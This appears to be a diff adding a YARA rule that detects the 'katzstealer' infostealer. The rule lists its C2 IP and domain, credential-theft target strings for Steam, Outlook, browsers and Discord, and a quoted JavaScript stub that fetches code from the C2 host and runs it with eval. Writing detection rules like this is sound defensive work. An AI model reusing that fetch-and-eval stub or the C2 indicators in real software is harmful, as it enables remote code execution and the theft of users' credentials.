@@ -1,0 +1,32 @@
+rule katzstealer {
+     meta:
+          author = "spicy-bear"
+          description = "Detects katzstealer malware"
+          hash = "da5ed6b939f51370709f66cbf0d8201ec8cd58b0"
+          filename = "SecuriteInfo.com.Win64.MalwareX-gen.12207.17348"
+
+     strings:
+          $c2_ip = "185.107.74.40"
+          $c2_domain = "zxczxczxczxc.twist2katz.com"
+          $user_agent = "katz-ontop"
+          $dll_name = "katz_ontop.dll"
+          $js_payload = "require('https').request({ hostname: 'zxczxczxczxc.twist2katz.com', path: '/api/getapicn?id=%s', headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 katz-ontop' } }, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)); }).end();\n\nmodule.exports = require(\"./core.asar\");\n"
+          $browser_string1 = "BROWSERS_INFO"
+          $browser_string2 = "GECKO_BROWSERS_INFO"
+          $steam_string = "Credentials/Steam_Apps.txt"
+          $outlook_string = "outlook/safe.dat"
+          $discord_string = "DISCORD_INFO"
+
+     condition:
+          (uint16(0) == 0x5a4d) and (
+              $c2_ip or
+              $c2_domain or
+              $user_agent or
+              $dll_name or
+              $js_payload or
+              ($browser_string1 and $browser_string2) or
+              $steam_string or
+              $outlook_string or
+              $discord_string
+          )
+}
